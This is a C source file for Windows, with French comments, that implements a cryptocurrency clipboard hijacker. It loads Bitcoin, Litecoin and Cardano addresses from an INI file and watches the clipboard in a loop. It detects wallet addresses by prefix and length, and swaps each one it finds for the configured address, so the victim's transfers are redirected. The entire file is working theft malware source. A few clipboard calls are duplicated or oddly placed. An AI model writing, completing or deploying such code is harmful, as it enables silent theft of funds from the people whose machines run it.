#include <stdio.h>
#include <windows.h>

#include "clipboard.h"
#include "utils.h"
#include "../lib/ini.h"

#define ADDRESS_SIZE 256

static wchar_t bitcoin_buffer[ADDRESS_SIZE];
static wchar_t litecoin_buffer[ADDRESS_SIZE];
static wchar_t cardano_buffer[ADDRESS_SIZE];

static int handler(void *user, const char *section,
                   const char *name, const char *value)
{
    (void)user;

    if (strcmp(section, "General") != 0)
        return 1;

    wchar_t *destination = NULL;
    size_t capacity = ADDRESS_SIZE;

    if (strcmp(name, "bitcoin_address") == 0)
        destination = bitcoin_buffer;
    else if (strcmp(name, "litecoin_address") == 0)
        destination = litecoin_buffer;
    else if (strcmp(name, "cardano_address") == 0)
        destination = cardano_buffer;

    if (destination != NULL) {
        size_t i = 0;

        // Conversion ASCII vers wchar_t
        while (value[i] != '\0' && i < capacity - 1) {
            unsigned char c = (unsigned char)value[i];

            if (c > 127)
                return 0; // Refuser les caractères non ASCII

            destination[i] = (wchar_t)c;
            i++;
        }

        if (value[i] != '\0')
            return 0; // Valeur trop longue

        destination[i] = L'\0';
    }

    return 1;
}

int read_ini(const char *filename)
{
    int error = ini_parse(filename, handler, NULL);

    if (error < 0) {
        fprintf(stderr, "Impossible d'ouvrir %s\n", filename);
        return 1;
    }

    if (error > 0) {
        fprintf(stderr, "Erreur INI à la ligne %d\n", error);
        return 1;
    }

    return 0;
}

StateCodeProcess main(void)
{
    // Définition des états de la machine à états
    typedef enum {
        STATE_ANALYZE_CLIPBOARD,
        STATE_MODIFY_CLIPBOARD,
        STATE_CLEAN_CLIPBOARD,
    } StateCodeFunction;

    // Définition des cryptomonnaies à surveiller
    typedef enum {
        BITCOIN,
        LITECOIN,
        CARDANO,
    } Cryptocurrency;

    // Définition de la taille du buffer pour stocker le texte du presse-papiers
    size_t buffer_size = 256;
    wchar_t buffer[buffer_size];

    // Définition des adresses de cryptomonnaies
    if (read_ini("../config/config.ini") != 0)
        return 1;

    // Les types sont conservés !
    const wchar_t *bitcoin_address = bitcoin_buffer;
    const wchar_t *litecoin_address = litecoin_buffer;
    const wchar_t *cardano_address = cardano_buffer;

    // Définition des variables pour la machine à états
    Cryptocurrency cryptocurrency;
    StateCodeFunction state = STATE_ANALYZE_CLIPBOARD;

    // Machine à états principale pour surveiller et modifier le presse-papiers
    while (true) {
        switch (state) {
            case STATE_ANALYZE_CLIPBOARD:

                if (getClipboardText(buffer, buffer_size) == STATE_ERROR) {
                    printf("[ERROR] -- Failed to get clipboard text.\n");
                    return STATE_ERROR;
                }

                if (getClipboardText(buffer, buffer_size) == STATE_WARNING) {
                    printf("[WARNING] -- Some issues could occur during the execution.\n");
                }

                int text_size = wcslen(buffer);

                // Vérification adresse déjà enregistrée
                if (wcscmp(buffer, bitcoin_address) == 0 || wcscmp(buffer, litecoin_address) == 0 || wcscmp(buffer, cardano_address) == 0) {
                    Sleep(500);
                    state = STATE_CLEAN_CLIPBOARD;
                    break;
                }

                // -------------------------------------------------- Vérification Bitcoin
                // Vérification adresse P2PKH et P2SH
                if (buffer[0] == L'1' || buffer[0] == L'3') {
                    if (text_size >= 26 && text_size <= 35) {
                        cryptocurrency = BITCOIN;
                        Sleep(500);
                        state = STATE_MODIFY_CLIPBOARD;
                        break;
                    }
                }

                // // Vérification adresse Bech32
                if (buffer[0] == L'b' && buffer[1] == L'c' && buffer[2] == L'1' && buffer[3] == L'q') {
                    if (text_size == 42 || text_size == 62) {
                        cryptocurrency = BITCOIN;
                        Sleep(500);
                        state = STATE_MODIFY_CLIPBOARD;
                        break;
                    }
                }

                // // Vérification adresse Bech32m
                if (buffer[0] == L'b' && buffer[1] == L'c' && buffer[2] == L'1' && buffer[3] == L'p') {
                    if (text_size == 62) {
                        cryptocurrency = BITCOIN;
                        Sleep(500);
                        state = STATE_MODIFY_CLIPBOARD;
                        break;
                    }
                }

                // -------------------------------------------------- Vérification Litecoin
                // Vérification adresse Legacy et Bech32
                if (buffer[0] == L'L' || buffer[0] == L'M' || (buffer[0] == L'l' && buffer[1] == L't' && buffer[2] == L'c' && buffer[3] == L'1')) {
                    if (text_size >= 26 && text_size <= 35) {
                        cryptocurrency = LITECOIN;
                        Sleep(500);
                        state = STATE_MODIFY_CLIPBOARD;
                        break;
                    }
                }

                // -------------------------------------------------- Vérification Cardano
                // Vérification adresse Shelley
                if (buffer[0] == L'a' && buffer[1] == L'd' && buffer[2] == L'd' && buffer[3] == L'r' && buffer[4] == L'1') {
                    if (text_size >= 58 && text_size <= 110) {
                        cryptocurrency = CARDANO;
                        Sleep(500);
                        state = STATE_MODIFY_CLIPBOARD;
                        break;
                    }
                }

                Sleep(500);
                break;

            case STATE_MODIFY_CLIPBOARD:

                wchar_t *crypto_address;
                if (cryptocurrency == BITCOIN) {
                    crypto_address = bitcoin_address;
                } else if (cryptocurrency == LITECOIN) {
                    crypto_address = litecoin_address;
                } else if (cryptocurrency == CARDANO) {
                    crypto_address = cardano_address;
                } else {
                    printf("[ERROR] -- Unknown cryptocurrency.\n");
                    return STATE_ERROR;
                }

                size_t size_crypto_address = getStringSize(crypto_address);

                if (setClipboardText(crypto_address, size_crypto_address) == STATE_ERROR) {
                    printf("[ERROR] -- Failed to set clipboard text.\n");
                    return STATE_ERROR;
                }

                if (setClipboardText(crypto_address, size_crypto_address) == STATE_WARNING) {
                    printf("[WARNING] -- Some issues could occur during the execution.\n");
                }

                Sleep(500);
                state = STATE_ANALYZE_CLIPBOARD;

                break;

            case STATE_CLEAN_CLIPBOARD:
                EmptyClipboard();
                Sleep(500);
                state = STATE_ANALYZE_CLIPBOARD;

                break;
        }
    }

    return STATE_OK;
}